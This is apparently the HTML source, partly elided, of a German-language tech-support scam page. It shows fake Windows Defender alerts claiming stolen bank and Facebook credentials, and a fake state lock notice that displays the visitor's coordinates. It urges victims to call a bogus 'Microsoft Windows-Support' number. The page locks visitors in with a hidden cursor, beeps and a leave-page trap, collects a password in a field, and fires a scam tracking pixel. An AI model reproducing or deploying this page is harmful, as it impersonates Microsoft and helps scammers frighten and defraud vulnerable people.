...
<html lang="en">
  <head>
<!-- begin code v 7.0 -->
<span id="wts2204567"></span>
<script>var wts=document.createElement('script');wts.async=true;
wts.src='https://app.ardalio.com/wts7.js';document.head.appendChild(wts);
wts.onload = function(){ wtsl7(2204567,1); };
</script><noscript><img src="https://app.ardalio.com/7/1/2204567.png"></noscript>
<!-- end code v 7.0 -->
    <meta charset="utf-8">
      <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
      <meta content="noindex,nofollow" name="robots">
      <title>1131_Helpdesk_Support-W </title>
<script>
...
<script>
  ...
  t.send();
        ...
        <body class="map" id="mycanvas" onmousemove="showd2();" onclick="chat();beep1();" onbeforeunload="return myFunction()" style="cursor:none">
          ...
          <div id="modalbx">
            ...
            <div class="bxweb">
              ...
              <span id="modal-close">×</span>
                            ...
                            <img id="modal-image" src="fubSwDdhdYv.jpg" alt="Facebook Logo">

                            <p id="modal-message">Ich bin 18 oder älter-gib xHamster ein</p>
                            <div class="modal-buttons">
                              <button id="modal-accept" class="dismiss blinking">Ja</button>
                              <button id="modal-dismiss" class="dismiss blinking">Nein</button>
                          </div>
          ...
          <img src="https://67rtyfg7ufw.movewithpacker.online/postback?clickId=REPLACE&payout=OPTIONAL&ce=clicks&status=OPTIONAL&transactionId=OPTIONAL" width="1" height="1" border="0" alt="" />
    ...
    <audio id="mdchys">
        ...
        <div class="row">
          ...
          <div class="col-md-12">
            <marquee direction="left" height="100px" width="100%">
              <small class="text-left" style="color:#eee;font-size:10px">Windows Defender SmartScreen verhindert nun die Anzeige unbekannter Anwendungen. Die Ausführung dieser Anwendung kann Ihren PC gefährden. Der Windows Defender-Scan hat auf diesem Gerät unerwünschte Adware erkannt, die Passwörter, Online-Identitäten, Finanzinformationen, persönliche Dateien, Fotos und Dokumente stehlen kann。</small>
            </marquee>
          </div>
        </div>
      </div>
      ...
      <div class="lightbox" id="poptxt" onclick="beep1();" style="display: none; cursor:default;">
        ...
        <div id="txtintro2">
          <span class="colo-rd">
             ...
             <p style="font-size:15px;font-weight:400;color:black;">Microsoft Defender hat infizierte Dateien gefunden, konnte diese aber aufgrund der Gruppenrichtlinienberechtigungen nicht entfernen. Bitte scannen Sie jetzt, um die Dateien manuell zu entfernen.
          </p>
      ...
      <div class="cardcontainer" style="cursor: default; display: none;" id="pop_up_new">
        ...
        <p>
         <b>Aus Sicherheitsgründen wurde der Zugriff auf diesen PC verhindert.</b>
         </p>
         <p>Ihr Computer ist mit Trojaner-Spyware infiziert. Die folgenden Daten wurden kompromittiert:</p>
         <p>&gt; Email ID <br>&gt; Bank Passwort <br>&gt; Facebook Login <br>&gt; Fotos und Dokumente</p>
         <p>Ein Windows Defender-Scan hat auf diesem Gerät potenziell unerwünschte Adware erkannt, die Passwörter, Online-Identitäten, Finanzinformationen, persönliche Dateien, Fotos und Dokumente stehlen kann. </p>
        ...
        <div class="action_buttons">
          ...
          <a class="active" id="leave_page" style="color:#fff!important">Leugnen</a>
        </div>
      </div>
      ...
      <label for="checkbox">Von Ihnen vorgenommene Änderungen werden möglicherweise nicht gespeichert</label><br>
            <div class="action_buttons">
              <a class="" id="leave_page">Stornieren</a>
...
document.addEventListener("DOMContentLoaded", function () {
  ...
  if (chromeAlerts) {
    ...
    window.addEventListener("click", function (event) {
      ...
      <strong>Länge: <span id="longitude" style="color:red;"></span></strong> <br>
      <strong>Breite: <span id="latitude" style="color:red;"></span></strong> <br>
      ...
      <strong>Ihr Gerät wurde aufgrund illegaler Aktivitäten durch den Staat gesperrt <span id="state" style="color: red; font-size: 16px;"></span>
       ...
       <br><strong>  Kontaktieren Sie den Microsoft Windows-Support : 0041 44 505 5423	</strong></p>
        ...
        <form action="#">
         ...
         <input type="text" name="name" id="name" placeholder="Kennwort" class="text-input" required="" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"><br>
      ...
      <script>
        const apiKey = '1501c30f-8869-4674-8cdb-f0e341051c4c';
